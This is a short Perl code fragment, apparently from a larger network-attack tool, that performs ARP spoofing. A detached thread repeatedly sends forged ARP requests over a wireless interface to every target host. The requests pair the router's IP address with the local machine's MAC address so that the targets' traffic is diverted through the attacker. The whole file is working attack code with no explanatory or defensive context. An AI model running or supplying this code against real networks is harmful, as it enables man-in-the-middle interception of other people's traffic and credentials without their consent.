my $arpquery_attackstatut = 1;
sub ARPQuery_Attack_Stop{
	$arpquery_attackstatut = 0;
}

sub ARPQuery_Attack_Start{
	my $ARPQueryThread = threads->new(\&ARPQuery_Attack_Thread);
    $ARPQueryThread->detach();
}

sub ARPQuery_Attack_Thread{
	my %targets = GetAttackTargets();
	my $localmac = GetLocalMac();
	my $router = GetAttackRouter();
	while ($arpquery_attackstatut) {

		foreach my $k (keys(%targets)) {
		    print STDERR "ARP SPOOFING SIP=$k SMAC=$targets{$k} USING IP : $router\n";
		    Net::ARP::send_packet('wlan0',                 # Device
	            $router,          # Source IP
	            $k,          # Destination IP
	            $localmac,  # Source MAC
	            $targets{$k},  # Destinaton MAC
	            'request');             # ARP operation
		}
		Time::HiRes::sleep(0.2);
	}
}

return 1;